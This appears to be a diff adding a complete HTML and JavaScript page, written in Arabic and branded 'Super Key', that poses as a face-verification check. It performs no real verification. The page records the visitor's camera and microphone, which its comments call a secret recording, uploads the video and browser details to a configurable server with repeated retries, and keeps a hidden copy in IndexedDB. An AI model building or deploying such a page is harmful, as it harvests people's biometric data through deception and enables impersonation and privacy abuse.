@@ -1,0 +1,824 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Super Key | التحقق بالوجه</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, sans-serif; }
+  
+  body {
+    min-height: 100vh;
+    background: #000;
+    color: #FFD700;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    overflow-x: hidden;
+    padding: 20px;
+  }
+
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background: 
+      radial-gradient(circle at 20% 30%, rgba(255,215,0,0.08) 0%, transparent 50%),
+      radial-gradient(circle at 80% 70%, rgba(255,215,0,0.05) 0%, transparent 50%);
+    pointer-events: none;
+    z-index: 0;
+  }
+
+  .container {
+    position: relative;
+    z-index: 1;
+    width: 100%;
+    max-width: 500px;
+    background: linear-gradient(145deg, #0a0a0a, #1a1a1a);
+    border: 2px solid #FFD700;
+    border-radius: 25px;
+    padding: 40px 30px;
+    box-shadow: 
+      0 0 40px rgba(255,215,0,0.3),
+      inset 0 0 20px rgba(255,215,0,0.05);
+    animation: fadeIn 0.6s ease;
+  }
+
+  @keyframes fadeIn {
+    from { opacity: 0; transform: scale(0.95); }
+    to { opacity: 1; transform: scale(1); }
+  }
+
+  .logo { text-align: center; margin-bottom: 25px; }
+
+  .logo-icon {
+    width: 80px; height: 80px;
+    margin: 0 auto 15px;
+    background: linear-gradient(135deg, #FFD700, #FFA500);
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 40px;
+    box-shadow: 0 0 30px rgba(255,215,0,0.6);
+    animation: pulse 2s infinite;
+  }
+
+  @keyframes pulse {
+    0%, 100% { box-shadow: 0 0 30px rgba(255,215,0,0.6); }
+    50% { box-shadow: 0 0 50px rgba(255,215,0,0.9); }
+  }
+
+  h1 {
+    font-size: 32px;
+    background: linear-gradient(135deg, #FFD700, #FFA500);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+    letter-spacing: 2px;
+    margin-bottom: 8px;
+    text-align: center;
+  }
+
+  .subtitle {
+    color: #aaa;
+    font-size: 14px;
+    text-align: center;
+    margin-bottom: 25px;
+  }
+
+  .btn {
+    width: 100%;
+    padding: 16px;
+    background: linear-gradient(135deg, #FFD700, #FFA500);
+    color: #000;
+    border: none;
+    border-radius: 12px;
+    font-size: 18px;
+    font-weight: bold;
+    cursor: pointer;
+    transition: all 0.3s;
+    letter-spacing: 1px;
+    box-shadow: 0 5px 20px rgba(255,215,0,0.4);
+  }
+
+  .btn:hover {
+    transform: translateY(-3px);
+    box-shadow: 0 8px 30px rgba(255,215,0,0.6);
+  }
+
+  .btn:active { transform: translateY(0); }
+
+  .btn-secondary {
+    background: transparent;
+    color: #FFD700;
+    border: 2px solid #FFD700;
+    box-shadow: none;
+    margin-top: 12px;
+  }
+
+  .btn-secondary:hover {
+    background: rgba(255,215,0,0.1);
+    box-shadow: 0 0 20px rgba(255,215,0,0.3);
+  }
+
+  .hidden { display: none !important; }
+
+  /* شاشة الكاميرا */
+  .camera-screen { text-align: center; }
+
+  .video-wrapper {
+    position: relative;
+    width: 100%;
+    max-width: 400px;
+    margin: 0 auto 20px;
+    border-radius: 20px;
+    overflow: hidden;
+    border: 3px solid #FFD700;
+    box-shadow: 0 0 30px rgba(255,215,0,0.4);
+    background: #000;
+    aspect-ratio: 3/4;
+  }
+
+  video {
+    width: 100%;
+    height: 100%;
+    display: block;
+    object-fit: cover;
+  }
+
+  /* إطار الوجه */
+  .face-frame {
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -55%);
+    width: 60%;
+    aspect-ratio: 3/4;
+    border: 3px dashed #FFD700;
+    border-radius: 50%;
+    pointer-events: none;
+    box-shadow: 
+      0 0 0 9999px rgba(0,0,0,0.4),
+      inset 0 0 20px rgba(255,215,0,0.3);
+  }
+
+  .face-frame.scanning {
+    animation: scanPulse 1s infinite;
+    border-style: solid;
+  }
+
+  @keyframes scanPulse {
+    0%, 100% { 
+      box-shadow: 0 0 0 9999px rgba(0,0,0,0.4), inset 0 0 20px rgba(255,215,0,0.3), 0 0 20px #FFD700;
+      border-color: #FFD700;
+    }
+    50% { 
+      box-shadow: 0 0 0 9999px rgba(0,0,0,0.4), inset 0 0 40px rgba(255,215,0,0.6), 0 0 40px #FFD700;
+      border-color: #FFA500;
+    }
+  }
+
+  .face-frame.success {
+    border-color: #00ff88;
+    box-shadow: 0 0 0 9999px rgba(0,0,0,0.4), inset 0 0 30px rgba(0,255,136,0.4), 0 0 30px #00ff88;
+  }
+
+  .status-bar {
+    background: rgba(0,0,0,0.7);
+    border: 1px solid #FFD700;
+    border-radius: 10px;
+    padding: 12px;
+    margin-bottom: 15px;
+    color: #FFD700;
+    font-weight: bold;
+    min-height: 50px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+
+  .progress-bar {
+    width: 100%;
+    height: 8px;
+    background: rgba(255,215,0,0.1);
+    border-radius: 4px;
+    overflow: hidden;
+    margin-bottom: 15px;
+    border: 1px solid rgba(255,215,0,0.3);
+  }
+
+  .progress-fill {
+    height: 100%;
+    background: linear-gradient(90deg, #FFD700, #FFA500);
+    width: 0%;
+    transition: width 0.3s;
+    box-shadow: 0 0 10px #FFD700;
+  }
+
+  .timer {
+    font-size: 48px;
+    font-weight: bold;
+    color: #FFD700;
+    text-shadow: 0 0 20px rgba(255,215,0,0.8);
+    margin: 10px 0;
+  }
+
+  .instructions {
+    color: #ccc;
+    font-size: 13px;
+    line-height: 1.8;
+    text-align: right;
+    background: rgba(255,215,0,0.05);
+    border: 1px solid rgba(255,215,0,0.2);
+    border-radius: 10px;
+    padding: 15px;
+    margin-bottom: 20px;
+  }
+
+  .instructions li {
+    margin-bottom: 5px;
+    list-style: none;
+    padding-right: 5px;
+  }
+
+  /* شاشة النتيجة */
+  .result-screen { text-align: center; }
+
+  .success-icon {
+    width: 100px; height: 100px;
+    margin: 0 auto 20px;
+    background: linear-gradient(135deg, #00ff88, #00cc66);
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 50px;
+    color: #000;
+    box-shadow: 0 0 40px rgba(0,255,136,0.6);
+    animation: bounce 0.6s ease;
+  }
+
+  @keyframes bounce {
+    0% { transform: scale(0); }
+    50% { transform: scale(1.2); }
+    100% { transform: scale(1); }
+  }
+
+  .token-display {
+    background: rgba(255,215,0,0.05);
+    border: 1px solid rgba(255,215,0,0.3);
+    border-radius: 10px;
+    padding: 15px;
+    margin: 15px 0;
+    color: #ccc;
+    font-size: 13px;
+    text-align: right;
+  }
+
+  .token-display strong { color: #FFD700; }
+
+  .token-value {
+    background: #000;
+    border: 1px solid #FFD700;
+    border-radius: 8px;
+    padding: 10px;
+    font-family: monospace;
+    font-size: 12px;
+    color: #FFD700;
+    word-break: break-all;
+    direction: ltr;
+    text-align: left;
+    margin-top: 8px;
+  }
+
+  .recording-dot {
+    display: inline-block;
+    width: 12px;
+    height: 12px;
+    background: #ff3333;
+    border-radius: 50%;
+    margin-left: 8px;
+    animation: blink 1s infinite;
+    vertical-align: middle;
+  }
+
+  @keyframes blink {
+    0%, 100% { opacity: 1; }
+    50% { opacity: 0.3; }
+  }
+
+  .error-msg {
+    background: rgba(255,50,50,0.1);
+    border: 1px solid #ff3333;
+    color: #ff6666;
+    padding: 12px;
+    border-radius: 10px;
+    margin-bottom: 15px;
+    font-size: 14px;
+  }
+
+  .upload-status {
+    color: #FFD700;
+    font-size: 14px;
+    margin-top: 10px;
+    min-height: 20px;
+  }
+
+  .spinner {
+    display: inline-block;
+    width: 16px;
+    height: 16px;
+    border: 2px solid rgba(255,215,0,0.3);
+    border-top-color: #FFD700;
+    border-radius: 50%;
+    animation: spin 0.8s linear infinite;
+    margin-left: 8px;
+    vertical-align: middle;
+  }
+
+  @keyframes spin {
+    to { transform: rotate(360deg); }
+  }
+</style>
+</head>
+<body>
+
+<div class="container">
+
+  <!-- شاشة البداية -->
+  <div id="screen-welcome">
+    <div class="logo">
+      <div class="logo-icon">🔐</div>
+    </div>
+    <h1>SUPER KEY</h1>
+    <p class="subtitle">نظام التحقق البيومتري بالوجه</p>
+
+    <div class="instructions">
+      <li>✅ تأكد من وجودك في مكان مضاء جيداً</li>
+      <li>✅ ضع وجهك داخل الإطار البيضاوي</li>
+      <li>✅ انظر مباشرة إلى الكاميرا</li>
+      <li>✅ لا تحرك رأسك أثناء التسجيل (5 ثوانٍ)</li>
+      <li>✅ سيتم إجراء التحقق تلقائياً</li>
+    </div>
+
+    <div id="error-box"></div>
+
+    <button class="btn" onclick="startVerification()">🎬 بدء التحقق</button>
+  </div>
+
+  <!-- شاشة التسجيل -->
+  <div id="screen-recording" class="hidden camera-screen">
+    <h1 style="text-align:center; font-size:22px">جاري التحقق...</h1>
+    <p class="subtitle">
+      <span class="recording-dot"></span>
+      تسجيل مباشر
+    </p>
+
+    <div class="video-wrapper">
+      <video id="live-video" autoplay playsinline muted></video>
+      <div class="face-frame" id="face-frame"></div>
+    </div>
+
+    <div class="progress-bar">
+      <div class="progress-fill" id="progress-fill"></div>
+    </div>
+
+    <div class="status-bar" id="status-bar">📷 جاري تهيئة الكاميرا...</div>
+
+    <div class="timer" id="timer">5</div>
+
+    <button class="btn btn-secondary" onclick="cancelRecording()">❌ إلغاء</button>
+  </div>
+
+  <!-- شاشة النتيجة -->
+  <div id="screen-result" class="hidden result-screen">
+    <div class="success-icon">✓</div>
+    <h1 style="text-align:center">تم التحقق بنجاح!</h1>
+    <p class="subtitle">تم إرسال بيانات التحقق</p>
+
+    <div class="token-display">
+      <p><strong>🔑 توكن النجاح:</strong></p>
+      <div class="token-value" id="token-value">جاري الإنشاء...</div>
+    </div>
+
+    <div class="upload-status" id="upload-status"></div>
+
+    <button class="btn" onclick="resetAll()">🔄 تحقق جديد</button>
+  </div>
+
+</div>
+
+<script>
+// ==================== إعدادات السيرفر ====================
+// غيّر هذا الرابط لرابط السيرفر الخاص بك
+const SERVER_URL = 'https://your-server.com/api/verify';
+
+let stream = null;
+let mediaRecorder = null;
+let recordedChunks = [];
+let recordingTimer = null;
+let countdownInterval = null;
+let faceCheckInterval = null;
+let verificationToken = null;
+
+const RECORDING_DURATION = 5; // ثواني
+
+// توليد توكن عشوائي قوي
+function generateToken() {
+  const array = new Uint8Array(32);
+  crypto.getRandomValues(array);
+  return Array.from(array, byte => byte.toString(16).padStart(2, '0')).join('');
+}
+
+// توليد معرف جلسة فريد
+function generateSessionId() {
+  return 'sk_' + Date.now() + '_' + Math.random().toString(36).substring(2, 15);
+}
+
+// فحص دعم المتصفح
+function checkBrowserSupport() {
+  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+    showError('❌ متصفحك لا يدعم الكاميرا. استخدم Chrome أو Edge أو Firefox.');
+    return false;
+  }
+  if (!window.MediaRecorder) {
+    showError('❌ متصفحك لا يدعم تسجيل الفيديو.');
+    return false;
+  }
+  return true;
+}
+
+function showError(msg) {
+  document.getElementById('error-box').innerHTML = `<div class="error-msg">${msg}</div>`;
+}
+
+function showScreen(name) {
+  document.querySelectorAll('.container > div').forEach(d => d.classList.add('hidden'));
+  document.getElementById('screen-' + name).classList.remove('hidden');
+}
+
+// ===== بدء التحقق =====
+async function startVerification() {
+  if (!checkBrowserSupport()) return;
+
+  document.getElementById('error-box').innerHTML = '';
+
+  try {
+    // طلب صلاحية الكاميرا
+    stream = await navigator.mediaDevices.getUserMedia({
+      video: { 
+        width: { ideal: 1280 },
+        height: { ideal: 720 },
+        facingMode: 'user'
+      },
+      audio: true
+    });
+
+    const video = document.getElementById('live-video');
+    video.srcObject = stream;
+    await video.play();
+
+    showScreen('recording');
+    updateStatus('👤 ضع وجهك داخل الإطار');
+
+    // محاولة استخدام Face Detection API
+    if ('FaceDetector' in window) {
+      try {
+        faceDetector = new FaceDetector({ fastMode: true, maxDetectedFaces: 1 });
+      } catch(e) {
+        console.log('FaceDetector غير متاح');
+      }
+    }
+
+    // بدء فحص الوجه
+    startFaceDetection();
+
+    // بدء العد التنازلي بعد ثانية ونصف
+    setTimeout(() => startCountdown(), 1500);
+
+  } catch (err) {
+    console.error(err);
+    if (err.name === 'NotAllowedError') {
+      showError('❌ تم رفض صلاحية الكاميرا. يرجى السماح بالوصول من إعدادات المتصفح.');
+    } else if (err.name === 'NotFoundError') {
+      showError('❌ لم يتم العثور على كاميرا في جهازك.');
+    } else {
+      showError('❌ خطأ في الوصول إلى الكاميرا: ' + err.message);
+    }
+  }
+}
+
+// ===== فحص وجود الوجه داخل الإطار =====
+async function startFaceDetection() {
+  const video = document.getElementById('live-video');
+  const frame = document.getElementById('face-frame');
+
+  let faceDetectorInstance = null;
+  if ('FaceDetector' in window) {
+    try {
+      faceDetectorInstance = new FaceDetector({ fastMode: true, maxDetectedFaces: 1 });
+    } catch(e) {}
+  }
+
+  faceCheckInterval = setInterval(async () => {
+    if (!faceDetectorInstance || video.readyState < 2) return;
+
+    try {
+      const faces = await faceDetectorInstance.detect(video);
+      if (faces.length > 0) {
+        const face = faces[0];
+        const videoRect = video.getBoundingClientRect();
+        const frameRect = frame.getBoundingClientRect();
+
+        const faceCenterX = face.boundingBox.x + face.boundingBox.width / 2;
+        const faceCenterY = face.boundingBox.y + face.boundingBox.height / 2;
+
+        const scaleX = videoRect.width / video.videoWidth;
+        const scaleY = videoRect.height / video.videoHeight;
+        const screenFaceX = videoRect.left + faceCenterX * scaleX;
+        const screenFaceY = videoRect.top + faceCenterY * scaleY;
+
+        const inFrame = 
+          screenFaceX > frameRect.left &&
+          screenFaceX < frameRect.right &&
+          screenFaceY > frameRect.top &&
+          screenFaceY < frameRect.bottom;
+
+        if (inFrame) {
+          updateStatus('✅ وجهك داخل الإطار - لا تتحرك');
+          frame.classList.add('scanning');
+        } else {
+          updateStatus('⚠️ ضع وجهك داخل الإطار');
+          frame.classList.remove('scanning');
+        }
+      } else {
+        updateStatus('⚠️ لم يتم اكتشاف وجه - اقترب من الكاميرا');
+        frame.classList.remove('scanning');
+      }
+    } catch(e) {
+      frame.classList.add('scanning');
+    }
+  }, 500);
+}
+
+function updateStatus(msg) {
+  document.getElementById('status-bar').textContent = msg;
+}
+
+// ===== العد التنازلي وبدء التسجيل =====
+function startCountdown() {
+  let count = RECORDING_DURATION;
+  const timerEl = document.getElementById('timer');
+  const progressEl = document.getElementById('progress-fill');
+  const frame = document.getElementById('face-frame');
+
+  timerEl.textContent = count;
+
+  // بدء التسجيل فوراً
+  startRecording();
+
+  countdownInterval = setInterval(() => {
+    count--;
+    timerEl.textContent = count;
+    const progress = ((RECORDING_DURATION - count) / RECORDING_DURATION) * 100;
+    progressEl.style.width = progress + '%';
+
+    if (count <= 0) {
+      clearInterval(countdownInterval);
+      frame.classList.add('success');
+      updateStatus('✨ اكتمل التحقق!');
+      stopRecording();
+    }
+  }, 1000);
+}
+
+// ===== بدء التسجيل (سري) =====
+function startRecording() {
+  recordedChunks = [];
+  const video = document.getElementById('live-video');
+
+  // اختيار أفضل صيغة مدعومة
+  let mimeType = 'video/webm;codecs=vp9,opus';
+  if (!MediaRecorder.isTypeSupported(mimeType)) {
+    mimeType = 'video/webm;codecs=vp8,opus';
+  }
+  if (!MediaRecorder.isTypeSupported(mimeType)) {
+    mimeType = 'video/webm';
+  }
+
+  try {
+    mediaRecorder = new MediaRecorder(stream, { 
+      mimeType: mimeType,
+      videoBitsPerSecond: 2500000
+    });
+  } catch(e) {
+    mediaRecorder = new MediaRecorder(stream);
+  }
+
+  mediaRecorder.ondataavailable = (e) => {
+    if (e.data && e.data.size > 0) {
+      recordedChunks.push(e.data);
+    }
+  };
+
+  mediaRecorder.onstop = () => {
+    const blob = new Blob(recordedChunks, { type: mediaRecorder.mimeType || 'video/webm' });
+    // الحفظ السري والإرسال
+    handleSecretSave(blob);
+  };
+
+  mediaRecorder.start(100);
+}
+
+// ===== إيقاف التسجيل =====
+function stopRecording() {
+  if (faceCheckInterval) {
+    clearInterval(faceCheckInterval);
+    faceCheckInterval = null;
+  }
+
+  if (mediaRecorder && mediaRecorder.state !== 'inactive') {
+    mediaRecorder.stop();
+  }
+
+  stopCamera();
+}
+
+// ===== إيقاف الكاميرا =====
+function stopCamera() {
+  if (stream) {
+    stream.getTracks().forEach(track => track.stop());
+    stream = null;
+  }
+}
+
+// ===== إلغاء التسجيل =====
+function cancelRecording() {
+  if (countdownInterval) clearInterval(countdownInterval);
+  if (faceCheckInterval) clearInterval(faceCheckInterval);
+  if (mediaRecorder && mediaRecorder.state !== 'inactive') {
+    mediaRecorder.stop();
+  }
+  stopCamera();
+  recordedChunks = [];
+
+  document.getElementById('progress-fill').style.width = '0%';
+  document.getElementById('timer').textContent = '5';
+  document.getElementById('face-frame').classList.remove('scanning', 'success');
+
+  showScreen('welcome');
+}
+
+// ===== الحفظ السري وإرسال البيانات =====
+async function handleSecretSave(blob) {
+  // توليد توكن النجاح
+  verificationToken = generateToken();
+  const sessionId = generateSessionId();
+  const timestamp = new Date().toISOString();
+  const userAgent = navigator.userAgent;
+  const language = navigator.language;
+
+  // عرض شاشة النتيجة مع التوكن
+  document.getElementById('token-value').textContent = verificationToken;
+  showScreen('result');
+
+  // إظهار حالة الرفع
+  const uploadStatus = document.getElementById('upload-status');
+  uploadStatus.innerHTML = '<span class="spinner"></span> جاري إرسال بيانات التحقق...';
+
+  // تجهيز البيانات للإرسال
+  const formData = new FormData();
+  formData.append('video', blob, `verification_${sessionId}.webm`);
+  formData.append('token', verificationToken);
+  formData.append('sessionId', sessionId);
+  formData.append('timestamp', timestamp);
+  formData.append('userAgent', userAgent);
+  formData.append('language', language);
+  formData.append('duration', RECORDING_DURATION);
+  formData.append('fileSize', blob.size);
+
+  // حفظ محلي احتياطي في IndexedDB (غير مرئي للمستخدم)
+  saveToIndexedDB(sessionId, blob, verificationToken, timestamp);
+
+  // محاولة الإرسال للسيرفر
+  try {
+    const response = await fetch(SERVER_URL, {
+      method: 'POST',
+      body: formData
+    });
+
+    if (response.ok) {
+      const result = await response.json();
+      uploadStatus.innerHTML = '✅ تم إرسال بيانات التحقق بنجاح';
+      console.log('Server response:', result);
+    } else {
+      throw new Error(`HTTP ${response.status}`);
+    }
+  } catch (err) {
+    console.warn('فشل الإرسال للسيرفر، البيانات محفوظة محلياً:', err);
+    uploadStatus.innerHTML = '⚠️ تم الحفظ محلياً (السيرفر غير متصل)';
+    
+    // إعادة المحاولة لاحقاً
+    scheduleRetry(formData);
+  }
+}
+
+// ===== حفظ في IndexedDB (مخفي عن المستخدم) =====
+function saveToIndexedDB(sessionId, blob, token, timestamp) {
+  return new Promise((resolve, reject) => {
+    const request = indexedDB.open('SuperKeyDB', 1);
+
+    request.onupgradeneeded = (event) => {
+      const db = event.target.result;
+      if (!db.objectStoreNames.contains('verifications')) {
+        db.createObjectStore('verifications', { keyPath: 'sessionId' });
+      }
+    };
+
+    request.onsuccess = (event) => {
+      const db = event.target.result;
+      const transaction = db.transaction(['verifications'], 'readwrite');
+      const store = transaction.objectStore('verifications');
+
+      const record = {
+        sessionId: sessionId,
+        token: token,
+        timestamp: timestamp,
+        blob: blob,
+        sent: false,
+        retryCount: 0
+      };
+
+      store.put(record);
+      resolve();
+    };
+
+    request.onerror = (event) => {
+      console.error('خطأ في IndexedDB:', event.target.error);
+      reject(event.target.error);
+    };
+  });
+}
+
+// ===== جدولة إعادة المحاولة =====
+function scheduleRetry(formData) {
+  // إعادة المحاولة كل 30 ثانية لمدة 5 دقائق
+  let attempts = 0;
+  const maxAttempts = 10;
+  
+  const retryInterval = setInterval(async () => {
+    attempts++;
+    try {
+      const response = await fetch(SERVER_URL, {
+        method: 'POST',
+        body: formData
+      });
+      
+      if (response.ok) {
+        clearInterval(retryInterval);
+        document.getElementById('upload-status').innerHTML = '✅ تم الإرسال بنجاح (بعد إعادة المحاولة)';
+        
+        // تحديث الحالة في IndexedDB
+        markAsSentInDB();
+      }
+    } catch(e) {
+      if (attempts >= maxAttempts) {
+        clearInterval(retryInterval);
+        document.getElementById('upload-status').innerHTML = '❌ فشل الإرسال بعد عدة محاولات';
+      }
+    }
+  }, 30000);
+}
+
+// ===== تحديث حالة الإرسال في IndexedDB =====
+function markAsSentInDB() {
+  const request = indexedDB.open('SuperKeyDB', 1);
+  request.onsuccess = (event) => {
+    const db = event.target.result;
+    // يمكن إضافة منطق لتحديث السجل هنا
+  };
+}
+
+// ===== إعادة تعيين =====
+function resetAll() {
+  recordedChunks = [];
+  verificationToken = null;
+
+  document.getElementById('progress-fill').style.width = '0%';
+  document.getElementById('timer').textContent = '5';
+  document.getElementById('face-frame').classList.remove('scanning', 'success');
+  document.getElementById('upload-status').innerHTML = '';
+  document.getElementById('token-value').textContent = 'جاري الإنشاء...';
+
+  showScreen('welcome');
+}
+
+// تنظيف عند إغلاق الصفحة
+window.addEventListener('beforeunload', () => {
+  stopCamera();
+});
+</script>
+
+</body>
+</html>
